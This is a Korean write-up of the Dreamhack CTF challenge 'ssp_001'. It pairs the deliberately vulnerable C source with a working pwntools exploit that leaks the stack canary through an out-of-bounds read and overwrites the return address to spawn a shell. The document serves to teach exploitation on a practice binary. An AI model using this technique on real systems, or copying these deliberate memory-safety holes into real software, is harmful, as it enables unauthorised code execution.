# [Dreamhack] ssp_001 풀이

---

# C 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

![카나리 보호기법이 적용되어있는 모습](/4%EC%A3%BC%EC%B0%A8/IMG/ssp0.png)

카나리 보호기법이 적용되어있는 모습

P를 입력하면 실행할수있는 print_box함수부분을 보면 outofbound 취약점을 발생시켜서 카나리값을 알 수 있을꺼같다. 그리고 E를 입력하면 read함수에서 문자열을 얼마나 입력받을지 값을 입력받고 read함수가 실행되는데 여기서 BOF를 발생시켜서 return주소를 변조시키면 문제가 해결될꺼같다.

---

# 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보를 정리해보자

- canary의 위치 구하기
- box배열에서 카나리값까지의 오프셋
- ebp에서 name배열까지의 오프셋

디버깅은 peda를 사용했습니다.

### canary값의 위치 구하기

![Untitled](/4%EC%A3%BC%EC%B0%A8/IMG/ssp1.png)

마지막에 카나리 값을 검증하는 부분이다. 카나리값은 ebp-0x8에 위치해있는것을 볼수있다.

그러면 ebp와 카나리 사이에 4바이트의 정체모를 데이터가 있다는걸 알수있다.

---

### box배열에서 카나리값까지 오프셋 구하기

![Untitled](/4%EC%A3%BC%EC%B0%A8/IMG/ssp2.png)

main함수에서 유저가 입력한 문자를 구분하는 부분이다. 순서대로 F, P, E 이다.

P를 입력하고 카나리값을 leak 해야하기 때문에 main+192부분을 보자.

![Untitled](/4%EC%A3%BC%EC%B0%A8/IMG/ssp3.png)

코드를 보다보니 box에 위치를 알아냈다. print_box함수를 실행하기전 ebp-0x88을 푸쉬해주는 걸로보아 box의 위치는 ebp-0x88인걸 알수있다.

0x88-0x8 = 0x80(10진수 : 128)

리틀엔디안방식으로 저장되어있으니까 131 → 130 → 129 → 128 이순서대로 카나리값을 구해서 합춰주면 될꺼같다.

---

### ebp ↔ name 거리구하기

![Untitled](/4%EC%A3%BC%EC%B0%A8/IMG/ssp4.png)

위 코드는 E를 입력했을때 name을 입력받는 부분이다. 보면 name배열은 0x48(10진수 : 72)만큼 떨어져 있는걸 알수있다. 

이제 모든 정보를 얻었으니 익스플로잇 코드를 짜보자.

---

# Exploit

```python
from pwn import *

p = process("./ssp_001")

#--------카나리 구하기--------
def canary_leak(a):
  p.sendline(b"P")
  p.recvuntil(b":")
  p.sendline(str(a))
  p.recvuntil(b": ")
  return p.recv()[:2]

canary = b""
for i in range(131,127,-1):
  canary += canary_leak(i)
canary = int(canary, 16)
print("canary :",hex(canary))

#--------ret주소 변조--------
get_shell = 0x080486b9
payload = b'A' * 64 #0x48에서 8만큼 빼준값
payload += p32(canary)
payload += b'B' * 4 #카나리와 ebp 사이에 있는 더미 4바이트
payload += b'C' * 4 #sfp 4바이트
payload += p32(get_shell) #ret 변조

p.sendline(b'E')
p.sendlineafter(b"Name Size : ", str(len(payload)))
p.sendlineafter(b"Name : ", payload)
p.interactive()
```

![Untitled](/4%EC%A3%BC%EC%B0%A8/IMG/ssp5.png)

쉘이 따진걸 볼수있다